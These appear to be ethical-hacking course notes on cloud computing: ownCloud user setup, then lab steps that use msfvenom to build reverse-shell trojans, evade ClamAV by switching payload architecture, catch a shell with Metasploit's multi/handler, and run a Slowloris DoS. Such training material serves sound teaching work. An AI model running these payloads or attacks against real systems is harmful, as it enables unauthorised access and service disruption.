# Module 19 - Cloud Computing #

## Creating User Accounts and Assigning User Rights ##

### ownCloud ###
1. Login as Admin into ``` http://localhost/owncloud ``` (There's also a client desktop app).
2. Right Menu > 'Users'
3. Enter the username and password into the 'Username' and 'Password' fields, select the Groups it will belong to and click on 'Create'
4. Left Menu > 'Files'
5. Add Icon > Select a folder to add > 'Share'
6. Double Click the newly added folder > Add > Upload a file
7. Go back to the Files section
8. Select the three dots in the newly added folder > 'Details' > 'Sharing' > Add the new user
9. Select the sharing permissions of the new user (Share and Edit)

In the desktop client app, you can access, copy, add, delete... the files and folders from the computer to _ownCloud_, such as with _OneDrive_.


- - - -

## Securing ownCloud from Malicious File Uploads ##

Create the Trojan (``` msfvenom -p windows/meterpreter/reverse_tcp -f exe > <Output Path>/trojan.exe ```) and upload it to ``` http://<Victim IP>/owncloud ```.

### ClamAV ###
It will detect the Trojan and stop the upload.



- - - -

## Bypassing ownCloud Antivirus and Hacking the Host ##
1. Create a malicious file (``` msfvenom -p linux/x86/shell/reverse_tcp LHOST=<Attacker IP> LPORT=<Attacker Port> --platform linux -f elf > <Output Path>/exploit.elf ```) and upload it to ``` http://<Victim IP>/owncloud ```.
2. ClamAV will not detect it because we've changed the payload architecture.
3. ``` msfconsole ``` > ``` use multi/handler ``` > ``` set payload linux/x86/shell/reverse_tcp ```, ``` set LHOST <Attacker IP> ```, ``` set LPORT <Attacker Port> ```, ``` exploit ```
4. Now, from the victim machine download the ``` exploit.elf ``` file, change its permissions (``` chmod -R 755 exploit.elf ```) and execute it (``` ./exploit.elf ```).
5. In the attacker machine, if Meterpreter does not start automatically interacting with the victim, type: ``` sessions -i 1 ```.


- - - -

## Implementing DoS Attack on Linux Cloud Server ##

### Slowloris Script ###
1. Go to the Slowloris folder (``` cd Desktop/Slowloris/ ```)
2. Change the permissions to the main file ``` chmod 777 Slowloris.pl ```
3. Perform the DoS attack: ``` ./Slowloris.pl -dns <Target IP> ```
